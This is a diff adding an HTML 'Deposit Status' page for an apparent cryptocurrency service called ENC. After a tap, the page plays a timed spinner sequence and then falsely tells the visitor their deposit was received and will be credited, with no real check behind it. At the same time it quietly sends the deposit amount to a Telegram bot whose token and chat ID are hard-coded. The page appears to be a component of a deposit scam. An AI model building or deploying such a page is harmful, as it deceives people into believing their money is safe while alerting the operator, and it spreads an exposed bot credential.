@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Deposit Status | ENC</title>
+  <link rel="icon" href="https://img.icons8.com/?size=100&id=100818&format=png&color=000000" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #f8fafc;
+      font-family: 'Segoe UI', 'Roboto', sans-serif;
+      color: #0f172a;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 1rem;
+    }
+
+    .card {
+      background-color: #ffffff;
+      border: 1px solid #e2e8f0;
+      padding: 3rem 2rem;
+      border-radius: 24px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.05);
+      width: 100%;
+      max-width: 520px;
+      height: 90vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    .logo {
+      width: 64px;
+      margin-bottom: 2rem;
+    }
+
+    .spinner {
+      width: 70px;
+      height: 70px;
+      border: 6px solid #e2e8f0;
+      border-top: 6px solid #3b82f6;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 2rem;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .checkmark-icon {
+      width: 60px;
+      height: 60px;
+      display: none;
+      margin-bottom: 1.5rem;
+      stroke: #fbbf24;
+      stroke-width: 2;
+      fill: none;
+    }
+
+    .message {
+      font-size: 1.1rem;
+      font-weight: 400;
+      color: #334155;
+      line-height: 1.6;
+      min-height: 80px;
+      max-width: 90%;
+    }
+
+    .fade-in {
+      animation: fadeIn 0.6s ease-in forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .footer {
+      margin-top: auto;
+      font-size: 0.85rem;
+      color: #64748b;
+      padding-top: 2rem;
+    }
+
+    .highlight {
+      color: #3b82f6;
+      font-weight: 500;
+    }
+
+    #unlock-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: transparent;
+      z-index: 9999;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <!-- Tap-to-unlock overlay -->
+  <div id="unlock-overlay"></div>
+
+  <div class="card" role="main" aria-live="polite">
+    <img src="https://assets.coingecko.com/coins/images/279/large/ethereum.png" alt="ENC Logo" class="logo" />
+    <div class="spinner" id="spinner"></div>
+
+    <svg class="checkmark-icon" id="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+      <circle cx="12" cy="12" r="10" />
+      <path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6l3 3" />
+    </svg>
+
+    <div class="message" id="message">Initializing secure connection...</div>
+    <div class="footer">Secured by <span class="highlight">TITANIUMFX</span></div>
+  </div>
+
+  <audio id="successSound" src="001.mp3" preload="auto"></audio>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const amount = params.get("amount");
+    const message = document.getElementById("message");
+    const spinner = document.getElementById("spinner");
+    const checkmark = document.getElementById("checkmark");
+    const overlay = document.getElementById("unlock-overlay");
+    const sound = document.getElementById("successSound");
+
+    function notifyTelegram(amount) {
+      fetch("https://api.telegram.org/bot7161440819:AAGkPsPHaVR-_YfySMwUqlRKkw_LQ7dH6uo/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "7710943481",
+          text: `🔔 ENC Deposit Notification:\n\nA user has initiated an ENC deposit of $${amount}.\nStatus: Verifying...\nTimestamp: ${new Date().toLocaleString()}`,
+          parse_mode: "Markdown"
+        })
+      }).catch(err => console.warn("Telegram error:", err));
+    }
+
+    function startFlow() {
+      overlay.remove();
+
+      if (!amount) {
+        message.textContent = "No deposit amount specified. Please retry.";
+        spinner.style.display = "none";
+        return;
+      }
+
+      setTimeout(() => {
+        message.textContent = `Verifying your ENC deposit of $${amount}...`;
+        notifyTelegram(amount);
+      }, 1200);
+
+      setTimeout(() => {
+        message.textContent = "Deposit request received and is under review.";
+      }, 3500);
+
+      setTimeout(() => {
+        spinner.style.display = "none";
+        checkmark.style.display = "block";
+        checkmark.classList.add("fade-in");
+        message.textContent = `We've received your ENC deposit of $${amount}. Funds will be credited shortly upon blockchain confirmation.`;
+        sound.play().catch(err => console.warn("Audio error:", err));
+      }, 5800);
+    }
+
+    overlay.addEventListener("click", startFlow);
+  </script>
+</body>
+</html>
